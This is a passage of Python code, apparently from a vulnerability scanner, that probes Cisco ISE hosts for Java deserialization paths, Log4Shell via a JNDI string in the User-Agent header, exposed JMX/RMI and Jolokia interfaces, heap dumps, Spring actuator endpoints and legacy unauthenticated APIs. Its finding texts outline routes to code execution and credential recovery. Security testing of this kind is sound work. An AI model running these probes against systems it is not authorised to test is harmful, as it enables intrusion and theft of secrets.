                    f'ERS SDK page on {host}:{port} references WSDL/SOAP '
                    f'endpoints — SOAP services may accept XML-encoded Java '
                    f'objects; WSDL enumeration reveals service operation names '
                    f'and parameter types usable for deserialization targeting. '
                    f'SOAP body parameters bind to Java objects whose class '
                    f'descriptors (JVM spec §4.4.1 CONSTANT_Class_info) must '
                    f'exist on the server classpath. '
                    f'Hint context: {re.findall(r".{0,60}wsdl.{0,60}", _txt_sdk, re.IGNORECASE)[:3]}'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # 3. Port 8910 pxGrid — serialized Java content probe
    #    pxGrid 2.0 uses STOMP over WSS; prior ISE versions exposed a
    #    REST/JSON control plane on 8910 HTTPS.  Check liveness first.
    # ------------------------------------------------------------------
    _pxgrid_live = False
    try:
        _sk = socket.create_connection((host, 8910), timeout=timeout)
        _sk.close()
        _pxgrid_live = True
    except Exception:
        pass

    if _pxgrid_live:
        _st_px, _body_px = _https_post(
            '/pxgrid/control/ServiceRegister',
            _SERIAL_NULL,
            'application/x-java-serialized-object',
            req_port=8910,
        )
        if _st_px is not None and _st_px == 500:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_PXGRID_DESERIALIZ',
                'detail':   (
                    f'POST /pxgrid/control/ServiceRegister on {host}:8910 with '
                    f'Java serialization magic returned HTTP 500 — pxGrid control '
                    f'plane attempted deserialization before error return; confirms '
                    f'ObjectInputStream path active on pxGrid listener. '
                    f'pxGrid is authenticated in production but pre-auth '
                    f'deserialization (before credential check) is the classic '
                    f'Cisco ISE CVE pattern (e.g. CSCvt75012 series). '
                    f'Response preview: {_body_px[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # 4. GET /api/v1/certs/system-certificate/nodeList — cert object list
    # ------------------------------------------------------------------
    _st_cert, _body_cert = _https_get('/api/v1/certs/system-certificate/nodeList')
    if _st_cert == 200 and _body_cert:
        _txt_cert = _body_cert.decode(errors='replace')
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_CERT_OBJECT_LIST',
            'detail':   (
                f'GET /api/v1/certs/system-certificate/nodeList on {host}:{port} '
                f'returned HTTP 200 without credentials — certificate object '
                f'list exposed; includes node identifiers, cert serial numbers, '
                f'and subject DNs that disclose internal ISE node topology and '
                f'PKI trust anchors. Certificate objects may include Java object '
                f'references in serialized API responses. '
                f'Preview: {_txt_cert[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 5. Log4Shell (CVE-2021-44228) response differential
    #    Send JNDI probe string in User-Agent to /admin/login.jsp.
    #    Compare HTTP status + body length vs baseline request.
    #    NO external JNDI server contacted — probe is the string literal only.
    # ------------------------------------------------------------------
    _jndi_probe = '${jndi:ldap://x.x.x.x/a}'
    # Baseline: normal User-Agent
    _st_base, _body_base = _https_get(
        '/admin/login.jsp',
        extra_headers={'User-Agent': 'Mozilla/5.0'},
    )
    # JNDI probe: Log4j-vulnerable path would trigger a lookup attempt
    # before returning a response, potentially causing a distinct status or delay
    _st_jndi, _body_jndi = _https_get(
        '/admin/login.jsp',
        extra_headers={'User-Agent': _jndi_probe},
    )
    if (_st_base is not None and _st_jndi is not None
            and _st_base == _st_jndi == 200
            and abs(len(_body_base) - len(_body_jndi)) > 200):
        # Significant body-size differential with identical status codes
        # suggests the server processed the JNDI string differently
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_LOG4SHELL_SURFACE',
            'detail':   (
                f'POST /admin/login.jsp on {host}:{port} shows body-size '
                f'differential of {abs(len(_body_base) - len(_body_jndi))} bytes '
                f'between baseline and Log4Shell probe User-Agent — suggests '
                f'Log4j string interpolation is active (CVE-2021-44228); '
                f'no external JNDI server contacted in this probe. '
                f'Baseline body: {len(_body_base)} bytes; '
                f'JNDI probe body: {len(_body_jndi)} bytes. '
                f'Confirm with a controlled JNDI listener in an isolated lab.'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # 6. GET /admin/javadoc/ — Javadoc exposure
    # ------------------------------------------------------------------
    _st_jd, _body_jd = _https_get('/admin/javadoc/')
    if _st_jd is not None and _st_jd < 400 and _body_jd:
        _txt_jd = _body_jd.decode(errors='replace')
        if re.search(r'Javadoc|<frame|allclasses|package-list|index\.html', _txt_jd, re.IGNORECASE):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_JAVADOC_EXPOSED',
                'detail':   (
                    f'GET /admin/javadoc/ on {host}:{port} returned HTTP {_st_jd} '
                    f'with Javadoc content — internal API documentation accessible '
                    f'without authentication; reveals package hierarchy, class '
                    f'names, method signatures, and field names for the ISE '
                    f'admin application. Preview: {_txt_jd[:200]}'
                ),
                'host': host,
                'port': port,
            })
            # Internal class documentation
            _classes = re.findall(
                r'(?:com\.cisco|com\.identix|org\.springframework)[\w\.]+(?=["<\s])',
                _txt_jd,
            )
            if _classes:
                _uniq_jd = list(dict.fromkeys(_classes))[:10]
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_INTERNAL_CLASS_DOCS',
                    'detail':   (
                        f'Javadoc on {host}:{port} exposes internal class '
                        f'documentation for: {_uniq_jd} — each class name is '
                        f'a CONSTANT_Class_info internal name (JVM spec §4.4.1) '
                        f'convertible to a .class path; cross-reference with '
                        f'known gadget chains (ysoserial payload list) to '
                        f'identify exploitable classes on the ISE classpath.'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_ise_jmx_monitoring_exposure(host: str, port: int = 9099, timeout: float = 10.0) -> list:
    """
    Detect exposed JMX and JVM monitoring interfaces in Cisco ISE.

    Java Management Extensions (JMX) provide the standard monitoring interface
    for JVM instrumentation. JMX agents expose MBeans (Managed Beans) via
    RMI (Remote Method Invocation) over JRMP (Java Remote Method Protocol),
    or via HTTP bridge agents such as Jolokia. When unauthenticated, JMX
    exposes heap memory statistics, thread states, classloader state, and
    runtime environment details that map directly to the JVM unified logging
    system metrics (java.lang:type=Memory/HeapMemoryUsage, type=GarbageCollector,
    type=Runtime) described in JVM Performance Engineering ch4/ch6.

    Cisco ISE uses Apache Cassandra internally for endpoint/session data;
    Cassandra exposes its own JMX interface on port 7199 for operational
    metrics including heap usage, GC pause times, and compaction state —
    all enumerable via JMX without authentication in default deployments.
    Per JVM Performance Engineering ch6, the MemoryUsage composite (init,
    used, committed, max) reflects current G1/ZGC heap region occupancy
    and TLAB buffer allocation rates.

    Jolokia (jolokia.org) is a REST-to-JMX bridge that translates HTTP
    GET/POST requests into JMX read/exec/list operations, removing the
    need for an RMI client. When deployed on ISE (WAR agent or embedded
    in Spring Boot), the entire MBean tree becomes accessible over HTTP.

    References: JVM Performance Engineering (Addison-Wesley) ch4 (Unified
    JVM Logging: heap, gc, jvmti tags); ch6 (G1/ZGC heap regions, TLAB
    metrics, java.lang.management.MemoryMXBean); JSR-160 (JMX Remote API);
    JRMP wire protocol (java.rmi.server.RemoteObject); Cisco ISE 3.1
    Install Guide ch2 (port matrix); CVE-2023-20202 (ISE JMX unauthenticated
    access).

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _tcp_raw(h, p, payload=b'', read_len=256):
        """Open TCP connection, optionally send payload, return response bytes or None."""
        try:
            with socket.create_connection((h, p), timeout=timeout) as s:
                if payload:
                    s.sendall(payload)
                s.settimeout(3.0)
                try:
                    return s.recv(read_len)
                except Exception:
                    return b''
        except Exception:
            return None

    def _https_get_jmx(path):
        """HTTPS GET on port 443; return (status, body)."""
        try:
            req = urllib.request.Request(
                f'https://{host}:443{path}',
                headers={'Accept': 'application/json, text/plain, */*'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # JRMP stream header: b'\x4a\x52\x4d\x49' = "JRMI", b'\x00\x02' = protocol
    # version 2, b'\x4b' = StreamType MULTIPLEX
    _JRMP_MAGIC = b'\x4a\x52\x4d\x49\x00\x02\x4b'
    # Java object serialization magic (java.io.ObjectStreamConstants):
    # STREAM_MAGIC = 0xACED, STREAM_VERSION = 0x0005
    _SERIAL_MAGIC = b'\xac\xed'

    # ------------------------------------------------------------------
    # 1. TCP port 9099 — Cisco ISE JMX default port
    # ------------------------------------------------------------------
    jmx_resp = _tcp_raw(host, 9099, payload=_JRMP_MAGIC)
    if jmx_resp is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_JMX_PORT_OPEN',
            'detail':   (
                f'TCP port 9099 on {host} is open — Cisco ISE default JMX/RMI '
                f'listener port. JMX exposes java.lang.management MBeans '
                f'(MemoryMXBean, GarbageCollectorMXBean, ThreadMXBean, '
                f'RuntimeMXBean) describing heap regions, TLAB allocation rates, '
                f'GC pause histograms, and classloader state. An unauthenticated '
                f'JMX endpoint grants full MBean enumeration and exec access '
                f'(invoke arbitrary public methods on registered MBeans including '
                f'MLet.addURL() for remote class loading leading to RCE).'
            ),
            'host': host,
            'port': 9099,
        })
        if jmx_resp and (
            _SERIAL_MAGIC in jmx_resp
            or b'JRMP' in jmx_resp
            or b'RMI' in jmx_resp
        ):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_JMX_RMI_RESPONSIVE',
                'detail':   (
                    f'Port 9099 on {host} returned a JRMP/RMI handshake response '
                    f'to JRMP stream magic (0x4a524d4900024b) — JMX RMI connector '
                    f'is live and responding. JRMP handshake without authentication '
                    f'challenge indicates unauthenticated JMX access; attacker can '
                    f'connect with jconsole or a raw RMI client, enumerate all '
                    f'MBeans (including MLet for arbitrary class loading), read '
                    f'heap statistics (HeapMemoryUsage composite: init/used/'
                    f'committed/max per MemoryUsage spec), and invoke executeGC(), '
                    f'dumpHeap(), or MLet.addURL() for remote code execution. '
                    f'Response (hex): {jmx_resp[:32].hex()}'
                ),
                'host': host,
                'port': 9099,
            })

    # ------------------------------------------------------------------
    # 2. TCP port 1099 — Java RMI registry
    # ------------------------------------------------------------------
    _RMI_LOOKUP = _JRMP_MAGIC + b'\x00' * 8
    rmi_resp = _tcp_raw(host, 1099, payload=_RMI_LOOKUP)
    if rmi_resp is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_RMI_REGISTRY_PORT',
            'detail':   (
                f'TCP port 1099 on {host} is open — Java RMI registry default '
                f'port. The RMI registry is the naming service that maps logical '
                f'service names ("jmxrmi", "com.cisco.ise.*") to RMI stub '
                f'objects; without authentication an attacker performs '
                f'registry list() to enumerate all bound names and obtain '
                f'stub descriptors for each registered service.'
            ),
            'host': host,
            'port': 1099,
        })
        if rmi_resp and any(
            tok in rmi_resp
            for tok in [b'jmxrmi', b'com.cisco', b'RmiConnector', b'jmxconnector']
        ):
            _svc_preview = rmi_resp.decode(errors='replace')[:200]
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_JMX_RMI_SERVICE',
                'detail':   (
                    f'RMI registry on {host}:1099 response contains JMX service '
                    f'name tokens ("jmxrmi"/"com.cisco") — JMX connector is '
                    f'registered in the RMI registry and accessible without '
                    f'authentication. Attacker obtains the RMI stub from '
                    f'registry list(), connects to the JMX connector server, '
                    f'and invokes MBeanServerConnection.queryMBeans() to dump '
                    f'the full MBean tree including java.lang:type=Memory '
                    f'HeapMemoryUsage composite values (init/used/committed/max '
                    f'per JVM Performance Engineering ch6 heap model). '
                    f'Preview: {_svc_preview}'
                ),
                'host': host,
                'port': 1099,
            })

    # ------------------------------------------------------------------
    # 3. Jolokia HTTP agent — REST bridge to JMX on port 443
    # ------------------------------------------------------------------
    _jolokia_paths = [
        ('/jolokia/',         'CRITICAL', 'ISE_JOLOKIA_EXPOSED'),
        ('/hawtio/jolokia/', 'HIGH',     'ISE_HAWTIO_JOLOKIA_EXPOSED'),
        ('/console/jolokia/', 'HIGH',    'ISE_CONSOLE_JOLOKIA_EXPOSED'),
    ]
    jolokia_live = False
    for _jpath, _jsev, _jtitle in _jolokia_paths:
        _jst, _jbody = _https_get_jmx(_jpath)
        if _jst is not None and _jst < 400 and _jbody:
            _jtxt = _jbody.decode(errors='replace')
            if any(tok in _jtxt for tok in ['jolokia', 'request', 'agent', 'MBean']):
                findings.append({
                    'severity': _jsev,
                    'title':    _jtitle,
                    'detail':   (
                        f'GET https://{host}:443{_jpath} returned HTTP {_jst} '
                        f'with Jolokia agent content — REST-to-JMX bridge '
                        f'accessible without authentication. Jolokia translates '
                        f'HTTP GET requests into JMX MBean read/exec/search '
                        f'operations, exposing the full MBean tree over HTTP '
                        f'without requiring an RMI client. '
                        f'Preview: {_jtxt[:300]}'
                    ),
                    'host': host,
                    'port': 443,
                })
                if _jpath == '/jolokia/':
                    jolokia_live = True

    if jolokia_live:
        # 3a. Classpath disclosure
        _cp_st, _cp_body = _https_get_jmx(
            '/jolokia/read/java.lang:type=Runtime/ClassPath'
        )
        if _cp_st is not None and _cp_st == 200 and _cp_body:
            _cp_txt = _cp_body.decode(errors='replace')
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_JMX_CLASSPATH_UNAUTH',
                'detail':   (
                    f'GET /jolokia/read/java.lang:type=Runtime/ClassPath on '
                    f'{host}:443 returned HTTP 200 — JVM runtime classpath '
                    f'readable without authentication. ClassPath attribute '
                    f'lists every JAR on the ISE JVM classpath; each JAR '
                    f'name and version maps to known vulnerability databases '
                    f'(Commons Collections, Log4j, Spring Framework). '
                    f'Cross-reference with ysoserial gadget chain list for '
                    f'RCE payload construction. '
                    f'Preview: {_cp_txt[:400]}'
                ),
                'host': host,
                'port': 443,
            })

        # 3b. Heap memory statistics
        _heap_st, _heap_body = _https_get_jmx(
            '/jolokia/read/java.lang:type=Memory/HeapMemoryUsage'
        )
        if _heap_st is not None and _heap_st == 200 and _heap_body:
            _heap_txt = _heap_body.decode(errors='replace')
            _used = _re.search(r'"used"\s*:\s*(\d+)', _heap_txt)
            _max  = _re.search(r'"max"\s*:\s*(\d+)', _heap_txt)
            _detail_heap = (
                f'Heap used={_used.group(1)} bytes, max={_max.group(1)} bytes'
                if _used and _max else f'Preview: {_heap_txt[:200]}'
            )
            findings.append({
                'severity': 'HIGH',
                'title':    'ISE_JMX_HEAP_STATS',
                'detail':   (
                    f'GET /jolokia/read/java.lang:type=Memory/HeapMemoryUsage '
                    f'on {host}:443 returned HTTP 200 — JVM heap memory '
                    f'statistics (MemoryUsage composite: init/used/committed/'
                    f'max) accessible without authentication. Per JVM Performance '
                    f'Engineering ch6, these values reflect current G1/ZGC '
                    f'heap region state including old-gen occupancy and TLAB '
                    f'allocation buffer utilization. {_detail_heap}'
                ),
                'host': host,
                'port': 443,
            })

        # 3c. Full MBean tree listing
        _list_st, _list_body = _https_get_jmx('/jolokia/list')
        if _list_st is not None and _list_st == 200 and _list_body:
            _list_txt = _list_body.decode(errors='replace')
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_JMXBEANS_LISTED_UNAUTH',
                'detail':   (
                    f'GET /jolokia/list on {host}:443 returned HTTP 200 — '
                    f'full JMX MBean tree enumerable without authentication. '
                    f'Jolokia list() returns every registered MBean domain, '
                    f'type, and attribute descriptor including exec-capable '
                    f'operations (dumpHeap, executeGC, addURL on MLet). '
                    f'Total response: {len(_list_body)} bytes. '
                    f'Preview: {_list_txt[:400]}'
                ),
                'host': host,
                'port': 443,
            })

    # ------------------------------------------------------------------
    # 4. GET /admin/jconsole — JConsole web UI
    # ------------------------------------------------------------------
    _jcon_st, _jcon_body = _https_get_jmx('/admin/jconsole')
    if _jcon_st is not None and _jcon_st < 400 and _jcon_body:
        _jcon_txt = _jcon_body.decode(errors='replace')
        if any(tok in _jcon_txt for tok in ['jconsole', 'JConsole', 'MBean', 'java.lang']):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_JCONSOLE_EXPOSED',
                'detail':   (
                    f'GET /admin/jconsole on {host}:443 returned HTTP {_jcon_st} '
                    f'with JConsole web UI content — browser-based JVM monitoring '
                    f'interface accessible. JConsole provides GUI access to the '
                    f'JVM MBean tree including heap usage graphs (mapped to '
                    f'java.lang:type=Memory MemoryUsage composite), thread state '
                    f'panels, and GC activity charts consistent with JVM unified '
                    f'logging gc+heap tags (JVM Performance Engineering ch4). '
                    f'Preview: {_jcon_txt[:200]}'
                ),
                'host': host,
                'port': 443,
            })

    # ------------------------------------------------------------------
    # 5. TCP port 7199 — Cassandra JMX (ISE internal Cassandra data store)
    # ------------------------------------------------------------------
    cassandra_resp = _tcp_raw(host, 7199, payload=_JRMP_MAGIC)
    if cassandra_resp is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_CASSANDRA_JMX_PORT',
            'detail':   (
                f'TCP port 7199 on {host} is open — Apache Cassandra JMX '
                f'monitoring port (ISE internal data store). Cassandra JMX '
                f'exposes StorageService, MemoryMXBean (JVM heap for the '
                f'Cassandra process), CompactionManager, and '
                f'org.apache.cassandra.metrics MBeans. Heap exposure maps '
                f'to G1/ZGC TLAB and region metrics (JVM Performance '
                f'Engineering ch6); CompactionManager.forceUserDefinedCompaction() '
                f'is an exec-capable MBean op triggering significant resource '
                f'consumption (denial-of-service potential).'
            ),
            'host': host,
            'port': 7199,
        })
        if cassandra_resp and (
            _SERIAL_MAGIC in cassandra_resp
            or b'RMI' in cassandra_resp
            or b'cassandra' in cassandra_resp.lower()
        ):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_CASSANDRA_JMX_UNAUTH',
                'detail':   (
                    f'Cassandra JMX on {host}:7199 returned a JRMP/RMI '
                    f'handshake response — Cassandra JMX connector is live '
                    f'without authentication. Attacker can read endpoint and '
                    f'session table metadata via StorageService.getKeyspaces(), '
                    f'invoke repair operations (StorageService.forceRepairAsync()), '
                    f'and enumerate JVM heap state for the Cassandra process. '
                    f'ISE stores NAD credentials, endpoint identities, and '
                    f'RADIUS session data in Cassandra — JMX exec access '
                    f'constitutes indirect credential exposure. '
                    f'Response (hex): {cassandra_resp[:32].hex()}'
                ),
                'host': host,
                'port': 7199,
            })

    return findings


def probe_ise_heap_dump_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Detect Cisco ISE heap dump and diagnostic file exposure.

    JVM heap dumps capture the complete object graph of a running Java process
    in HPROF binary format (Oracle/OpenJDK HPROF agent documentation). The
    dump includes every live object's field values at capture time, meaning
    any String or byte[] field holding a password, session token, cryptographic
    key, or RADIUS shared secret appears in plaintext within the HPROF stream.
    The G1 and ZGC heap structures described in JVM Performance Engineering
    ch6 (eden/survivor/old-gen regions, TLAB buffers, PLAB promotion records)
    are all captured in the dump — it is a complete forensic snapshot of the
    JVM's runtime memory state at the instant the dump was triggered.

    Thread dumps record the call stack of every live thread at capture time.
    Each stack frame identifies the class name (CONSTANT_Class_info internal
    name, JVM spec §4.4.1), method name, and line number; frames within
    authentication or session-management code expose the call path an
    attacker needs to construct exploitable deserialization gadget chains
    targeting classes already on the ISE classpath.

    Spring Boot Actuator endpoints (/actuator/*) are management interfaces
    enabled by spring-boot-actuator. When exposed without authentication
    (spring.security.user.* not configured, or
    management.endpoints.web.exposure.include=* in misconfigured deployments),
    they expose heap dumps, thread dumps, environment variables, and log files.
    Cisco ISE 3.x uses Spring Framework internally; actuator endpoints may
    also appear under /api/actuator/* or /rest/actuator/* depending on the
    deployment's context-path configuration.

    References: JVM Performance Engineering (Addison-Wesley) ch6 (heap
    regions, TLAB/PLAB, G1/ZGC memory model, MemoryUsage composite data);
    Oracle HPROF agent documentation (heap dump binary format); Spring Boot
    Actuator reference (spring.io); Cisco ISE 3.1 Install Guide ch2 (port
    matrix); CVE-2022-22965 (Spring4Shell — actuator env as precondition);
    CVE-2023-20195 (ISE arbitrary file read via admin diagnostic interface).

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _https_get(path):
        try:
            req = urllib.request.Request(
                f'https://{host}:{port}{path}',
                headers={'Accept': 'application/json, text/plain, */*'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # HPROF binary format magic: "JAVA PROFILE 1.0.2\0" (first 12 bytes confirm format)
    _HPROF_MAGIC = b'JAVA PROFILE'

    # ------------------------------------------------------------------
    # 1. Direct admin heap/thread dump endpoints
    # ------------------------------------------------------------------
    _admin_dump_paths = [
        ('/admin/heapdump',               'CRITICAL', 'ISE_HEAP_DUMP_ENDPOINT',
         'heap dump'),
        ('/admin/threaddump',             'CRITICAL', 'ISE_THREAD_DUMP_ENDPOINT',
         'thread dump'),
        ('/admin/diagnostics/thread-dump','HIGH',     'ISE_THREAD_DUMP_ALT',
         'thread dump (alternate diagnostic path)'),
    ]
    for _path, _sev, _title, _desc in _admin_dump_paths:
        _st, _body = _https_get(_path)
        if _st is not None and _st < 400 and _body:
            _txt = _body.decode(errors='replace')
            _is_heap = _HPROF_MAGIC in _body
            _is_stack = any(tok in _txt for tok in [
                'java.lang', 'at com.cisco', 'at org.springframework',
                'Thread', 'BLOCKED', 'WAITING', 'RUNNABLE',
            ])
            if _is_heap or _is_stack or _st == 200:
                _extra = (
                    ' HPROF binary format confirmed — full object graph capture.'
                    if _is_heap else (
                        ' Stack traces detected — frames expose internal class '
                        'paths and method signatures.'
                        if _is_stack else ''
                    )
                )
                findings.append({
                    'severity': _sev,
                    'title':    _title,
                    'detail':   (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                        f'ISE {_desc} endpoint accessible without authentication. '
                        f'{_extra} '
                        f'A heap dump captures every live JVM object field value '
                        f'at capture time including RADIUS shared secrets in '
                        f'char[]/String fields, TLS session keys in byte[] '
                        f'buffers, and in-flight authentication context objects. '
                        f'Total: {len(_body)} bytes. '
                        f'Preview: {_txt[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })

    # ------------------------------------------------------------------
    # 2. Spring Boot Actuator endpoints
    # ------------------------------------------------------------------
    _actuator_prefixes = ['/actuator', '/api/actuator', '/rest/actuator']
    _actuator_endpoints = [
        ('heapdump',  'CRITICAL', 'ISE_SPRING_HEAPDUMP_UNAUTH',
         'Spring Boot actuator heap dump (HPROF binary) — complete JVM object '
         'graph; every in-memory credential, session token, and cryptographic '
         'key readable from the dump file'),
        ('threaddump', 'CRITICAL', 'ISE_SPRING_THREADDUMP_UNAUTH',
         'Spring Boot actuator thread dump (JSON: all thread states + full '
         'stack traces with class/method/line detail) — authentication code '
         'paths visible in blocked/waiting thread stacks'),
        ('env',       'CRITICAL', 'ISE_SPRING_ENV_UNAUTH',
         'Spring Boot actuator /env — complete Spring Environment PropertySource '
         'tree including application.properties, system env vars '
         '(DB passwords, LDAP bind credentials, RADIUS secrets)'),
        ('beans',     'HIGH',     'ISE_SPRING_BEANS_UNAUTH',
         'Spring Boot actuator /beans — full Spring application context bean '
         'definitions (class names, dependency graph, scope) enabling precise '
         'gadget-chain construction for deserialization attacks'),
        ('mappings',  'HIGH',     'ISE_SPRING_MAPPINGS_UNAUTH',
         'Spring Boot actuator /mappings — complete HTTP endpoint mapping table '
         '(handler method, request conditions, media types) enumerating every '
         'undocumented ISE REST endpoint'),
        ('logfile',   'CRITICAL', 'ISE_SPRING_LOGFILE_UNAUTH',
         'Spring Boot actuator /logfile — rolling application log tail; ISE '
         'authentication logs contain RADIUS usernames, MAC addresses, and '
         'authentication failure details'),
    ]
    _seen_titles: set = set()
    for _prefix in _actuator_prefixes:
        for _ep, _sev, _base_title, _edesc in _actuator_endpoints:
            if _base_title in _seen_titles:
                continue
            _path = f'{_prefix}/{_ep}'
            _st, _body = _https_get(_path)
            if _st is not None and _st < 400 and _body and len(_body) > 10:
                _txt = _body.decode(errors='replace')
                _is_hprof = _HPROF_MAGIC in _body
                _extra = ' HPROF binary format confirmed.' if _is_hprof else ''
                _preview = (
                    f'[binary HPROF, {len(_body)} bytes]'
                    if _is_hprof else _txt[:300]
                )
                findings.append({
                    'severity': _sev,
                    'title':    _base_title,
                    'detail':   (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                        f'{_edesc}.{_extra} '
                        f'Preview: {_preview}'
                    ),
                    'host': host,
                    'port': port,
                })
                _seen_titles.add(_base_title)

    # ------------------------------------------------------------------
    # 3. Support bundle and backup endpoints
    # ------------------------------------------------------------------
    _support_paths = [
        ('/admin/support-bundle', 'CRITICAL', 'ISE_SUPPORT_BUNDLE_EXPOSED',
         'ISE support bundle download — compressed archive of system '
         'configuration, logs, and diagnostic data; contains running-config '
         'with RADIUS/TACACS shared secrets, certificate private keys, '
         'and LDAP bind credentials in configuration exports'),
        ('/admin/backup',         'CRITICAL', 'ISE_BACKUP_ENDPOINT_EXPOSED',
         'ISE backup endpoint accessible — may expose or trigger creation of '
         'configuration backup containing all ISE policy, user credentials, '
         'PKI certificates, and external identity source bindings; backup '
         'archives are AES-encrypted but the passphrase may be recoverable '
         'from JVM heap via /actuator/heapdump or /admin/heapdump'),
    ]
    for _path, _sev, _title, _desc in _support_paths:
        _st, _body = _https_get(_path)
        if _st is not None and _st < 400 and _body:
            _txt = _body.decode(errors='replace')
            findings.append({
                'severity': _sev,
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. '
                    f'Total: {len(_body)} bytes. '
                    f'Preview: {_txt[:200]}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_ise_legacy_api_endpoint_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # Dead-code/legacy API generations: /admin/API/ (pre-ERS), /ers/config/, /api/v1/, feature/migration paths
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str) -> tuple:
        try:
            _req = urllib.request.Request(
                f'https://{host}:{port}{path}',
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/html, */*'},
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(4096), dict(_r.headers)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            return _e.code, _b, {}
        except Exception:
            return None, b'', {}

    _legacy_paths = [
        ('/admin/API/',
         'HIGH', 'ISE_LEGACY_ADMIN_API_ROOT',
         'Pre-ERS /admin/API/ root accessible — legacy admin API generation; '
         'dead-code paths commonly survive refactoring with relaxed auth checks '
         'relative to the /ers/config/ successor'),
        ('/admin/API/NetworkDeviceGroups/',
         'CRITICAL', 'ISE_LEGACY_NDG_API_UNAUTH',
         '/admin/API/NetworkDeviceGroups/ accessible — legacy network device group '
         'enumeration without ERS credential gate; duplicate-credential-check '
         'anti-pattern creates alternate auth path to the same backing entities'),
        ('/admin/API/NetworkDevice/',
         'CRITICAL', 'ISE_LEGACY_NAD_API_UNAUTH',
         '/admin/API/NetworkDevice/ accessible — pre-ERS NAD object listing; '
         'separate Spring controller registration means auth may differ from '
         '/ers/config/networkdevice/ on the same JVM'),
        ('/admin/API/InternalUser/',
         'CRITICAL', 'ISE_LEGACY_USER_API_UNAUTH',
         '/admin/API/InternalUser/ accessible — legacy identity store enumeration; '
         'god-class controller may share auth state fields with ERS tier '
         'using nullable auth that defaults to allow on missing session token'),
        ('/ise/config/',
         'HIGH', 'ISE_LEGACY_ISE_PREFIX_CONFIG',
         '/ise/config/ prefix accessible — alternate URL namespace from older ISE '
         'releases; Spring Security filter-chain may not cover this prefix if '
         'not remapped during the ERS migration refactor'),
        ('/ise/rest/',
         'HIGH', 'ISE_LEGACY_ISE_REST_PREFIX',
         '/ise/rest/ prefix reachable — legacy REST namespace predating ERS '
         'standardization; missing from current security configuration = '
         'effective auth bypass via unmapped path'),
    ]

    for _path, _sev, _title, _desc in _legacy_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body and len(_body) > 5:
            _txt = _body.decode(errors='replace')
            findings.append({
                'severity': _sev,
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. Preview: {_txt[:300]}'
                ),
                'host': host,
                'port': port,
            })

    _ers_resources = [
        ('/ers/config/',
         'HIGH', 'ISE_ERS_CONFIG_ROOT_OPEN',
         'ERS /ers/config/ root listing accessible without auth — resource '
         'discovery surface; god-class ERS controller shares auth-state fields '
         'across resource types; nullable auth field defaults to permit on '
         'unannotated collection endpoints'),
        ('/ers/config/endpoint/',
         'CRITICAL', 'ISE_ERS_ENDPOINT_UNAUTH',
         'ERS endpoint collection at /ers/config/endpoint/ unauthenticated — '
         'MAC address and profile data readable without credential challenge'),
        ('/ers/config/networkdevice/',
         'CRITICAL', 'ISE_ERS_NAD_UNAUTH',
         'ERS /ers/config/networkdevice/ readable without auth — RADIUS shared '
         'secrets and device management IPs exposed; duplicate-auth-path: '
         '/admin/API/NetworkDevice/ and /ers/config/ enforce different checks '
         'on the same Hibernate-backed entity'),
        ('/ers/config/internaluser/',
         'CRITICAL', 'ISE_ERS_USER_UNAUTH',
         'ERS /ers/config/internaluser/ accessible — identity store enumeration; '
         'feature-envy anti-pattern: ERS user resource directly accesses identity '
         'store entities without encapsulated authorization wrapper'),
        ('/ers/config/endpointgroup/',
         'HIGH', 'ISE_ERS_ENDPOINTGROUP_UNAUTH',
         'ERS endpoint group listing at /ers/config/endpointgroup/ readable — '
         'profiling group membership disclosure without authentication'),
    ]

    for _path, _sev, _title, _desc in _ers_resources:
